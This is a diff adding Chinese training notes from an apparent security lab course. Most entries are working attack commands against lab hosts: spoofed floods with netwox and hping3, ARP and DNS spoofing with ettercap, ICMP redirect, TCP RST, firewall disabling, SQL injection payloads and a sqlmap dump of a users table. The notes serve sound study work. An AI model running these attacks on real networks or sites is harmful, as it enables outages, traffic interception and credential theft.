@@ -1,0 +1,180 @@
+# 实训笔记
+
+1. 安装软件：apt-get install xxx
+
+2. 查看文件：cat 路径
+
+3. vi操作：
+
+   1. 进入插入模式：按i
+
+   2. 退出：按  ==：== ，: w filename （输入 「w filename」将文章以指定的文件名filename保存）
+
+      : wq (输入「wq」，存盘并退出vi)
+
+      : q! (输入q!， 不存盘强制退出vi)
+
+4. export PATH=$PATH:/usr/sbin
+
+5. 桥接模式：虚拟机和物理机在一个子网中
+
+   ![image-20200713113641074](C:\Users\Lch\AppData\Roaming\Typora\typora-user-images\image-20200713113641074.png)
+
+6. NAT模式：虚拟机在物理机的==私有网段==中
+
+7. host文件路径：C:\Windows\System32\drivers\etc\hosts
+
+8. 源ip地址伪装的dos攻击：
+
+   > 原理：伪造源IP（躲避防火墙）发送大量TCP连接请求包，造成服务器瘫痪
+
+   1. 提权至root用户：sudo su -  root
+   2. Ubuntu监听端口：tcpdump -i eth0 tcp port 80 -n -nn
+   3. 其中apache2：service apache2 start
+   4. 伪装固定ip、MAX请求：netwox 52 -E "0:1:2:3:4:5" -I "伪装ip" -e "00:0c:29:83:36:d7" -i "目的ip"
+      1. -E 伪造源MAX
+      2. -I 伪造IP
+      3. -e 目标mac（随便填）
+      4. -i 目标ip
+   5. 随机泛洪攻击：netwox 76 -i  "ipadr" -p  -port
+
+9. ARP（IP和MAC映射协议）欺骗中间人攻击：
+
+   > 原理：不断发送arp欺骗包，对目标的arp缓存表进行污染，目标ip发送到伪装ip的包会被攻击者截获
+
+   1. 向局域网中某ip伪装某ip：ettercap -i eth0 -Tq -M arp:remote /欺骗的ip//   /伪装的ip//
+      1. -i  网关
+      2. -Tq  文本输出
+   2. 监听某网卡传输来的信息：ettercap -Tq -i eth0
+   3. 开启kali的转发模式，让目标可以正常上网：echo 1 > /proc/sys/net/ipv4/ip_forward
+   4. 验证是否开启：cat /proc/sys/net/ipv4/ip_forward
+   5. 查看自己的arp表：arp -a
+   6. ARP欺骗后就能获取到由欺骗IP发往伪装ip的全部数据包，但是本机必须与被欺骗IP在同一局域网
+
+10. ICMP路由重定向（伪装成网关）攻击
+
+    > 在网络中发送ICMP重定向路径报文来实现攻击
+
+    1. 查看路由表：route -C -n
+
+    2. 靶机必须设置：echo 1 > /proc/sys/net/ipv4/conf/all/accept_redirects
+
+       echo 1 > /proc/sys/net/ipv4/conf/eth0/accept_redirects
+
+       echo 1 > /proc/sys/net/ipv4/conf/default/accept_redirect
+
+    3. 并重启网络服务：/etc/init.d/networking restart
+
+    4. 进行ICMP攻击：netwox 86 -g 192.168.23.134 -i 192.168.23.133
+
+       1. -g  攻击者ip（要替换的网关ip）
+       2. -i  靶机当前网关ip
+
+11. TCP之RST攻击
+
+    > 给正常的TCP连接的一方发送RST报文，造成其TCP连接中断
+
+    1. 服务器在端口7777启动nc进程：nc -l -p 7777
+    2. 客户端与服务器的7777端口的nc进程进行TCP连接：nc 192.168.23.132 7777
+    3. 攻击者netwox 78 -i  192.168.23.133
+    4. 结果：中断了客户端与服务器之间的TCP连接
+
+12. TCP之SYN Flood攻击：
+
+    > 通过大量的真实的TCP请求SYN报文，消耗目标主机的连接队列资源
+
+    1. 查看80端口的状态：lsof -i :80或netstat -an |grep :80
+    2. SYN泛洪攻击：netwox 76 -i 192.168.23.133 -p  80
+    3. 防御方式：设置SYN RECV超时时限，或扩大连接数量限制
+
+13. UDP之SYN Flood攻击
+
+    >向目标主机发送大量不可靠的UDP包，占用对方计算资源
+
+    1. 监听 eth0网卡的udp服务：tcpdump -i eth0 udp -n
+    2. 发动udp泛洪攻击：hping3 --udp -p 53 192.168.23.133（ctrl+c结束）
+    3. 使用随机源地址发送UDP泛洪攻击：hping3 --udp -p 53 --flood --rand-source 192.168.23.133
+    4. 防御方式：设置防火墙，设置UDP的接收速率
+
+14. DRDos反射：
+
+    <img src="实训笔记.assets/image-20200714145452745.png" alt="image-20200714145452745" style="zoom: 67%;" />
+
+15. DNS欺骗攻击
+
+    > 欺骗目标主机，是其认为攻击者是DNS服务器
+
+    1. 使用dns服务，nslookup，再输入域名
+    2. 在ettercap的dns表中添加自定义DNS返回规则（例如对于所有以.com结尾的域名返回192.168.23.132）:vi /etc/ettercap/etter.dns。再添加*.com A 192.168.23.132
+    3. 图形化启动ettercap，先点击嗅探、再点击host列表，选择target1作为欺骗主机，target作为伪装主机，点击地球中的ARPpoisoning，污染target1中的arp表，达到欺骗的目的
+    4. 被欺骗的主机的所有DNS请求都会发往攻击者，由攻击者处理
+    5. 注意：攻击者必须和被攻击者有一条直接通路
+
+16. TCP的会话劫持
+
+    > 劫持通信双方已建立的TCP会话连接，冒充其中的一方与另一方进行连接
+
+    1. arp欺骗：称为中间人
+    2. 关闭防火墙：sudo service ufw stop;ufw disable;service iptables stop
+
+17. 在url参数值后面加‘，查看是否会报错来判断是否存在注入
+
+18. database():显示当前数据库名
+
+19. user():显示当前用户名
+
+20. union联合查询的字段必须和源查询字段一致（种类个数）
+
+21. sql注释：--+可注释后面语句
+
+22. order by 3：表示将查询结果按照第==3==个字段升序排序，如果没有第3个字段则会报错，所以用作探测该表中有==多少个字段==
+
+23. 1' and1=2 union select 1,2,3 --+
+
+    1. 1’：用于让之前的sql查询语句闭合，使其语法无误
+    2. and 1=2：虽然之前语句语法无误，但1=2显然不成立，让其不输出结果
+    3. union select 1,2,3：将1,2,3作为sql查询结果输出给php（order by 后面数据的个数必须和之前select查询的字段数相同）
+    4. --+：注释sql中后面语句
+    5. 这句的目的是获得查询语句的哪些字段会==显示==在页面上，例如 1，2,3,4....n,中哪些数字输出了，哪第几个字段就会被输出
+
+24. group_concat（name）:将查询字段作为一个字符串用，连接输出
+
+25. MYSQL中有一个自带==数据库==information_schema，里面有张
+
+    1. ==数据表==tables，表中有
+       1. ==字段==table_schema（范围是整个mysql的数据库名），和
+       2. ==字段==table_name(范围是整个mysql的表名)
+    2. 数据表columns，表中有
+       1. table_schema:包括所有数据库名
+       2. table_name:包括所有表名
+       3. column_name:包括所有字段名
+
+26. limit n,1：可以显示出输出结果的第n+1行的结果，后面那个1固定为1
+
+27. int类型注入不需要使用 ’
+
+28. 对于不回显的php文件：使用extractvalue（）报错回显数据；
+
+29. extractvalue(1,concat(0x23,(select  ...),0x23))
+
+30. sqlmap用法
+
+    1. 查询有哪些数据库：sqlmap -u http://192.168.23.132/sqli-labs/Less-5/?id=6 -dbs
+    2. 查询某个数据库有哪些数据表：sqlmap -u http://192.168.23.132/sqli-labs/Less-5/?id=6 -D security --tables
+    3. 查询某张表有哪些字段：sqlmap -u http://192.168.23.132/sqli-labs/Less-5/?id=6 -D security -T users --columns
+    4. 查询哪些字段有哪些内容：sqlmap -u http://192.168.23.132/sqli-labs/Less-5/?id=6 -D security -T users -C id,username,password --dump
+
+31. XSS漏洞:
+
+## php
+
+1. 整个文件必须在<?php     code         ?>之中
+2. 每个语句后面要加分号；
+3. 变量前一面加$
+4. 输出语句 echo
+5. header("Content-Type:text/html;charset=utf-8");
+6. 字符串用 **.** 连接
+7.  
+
+
+
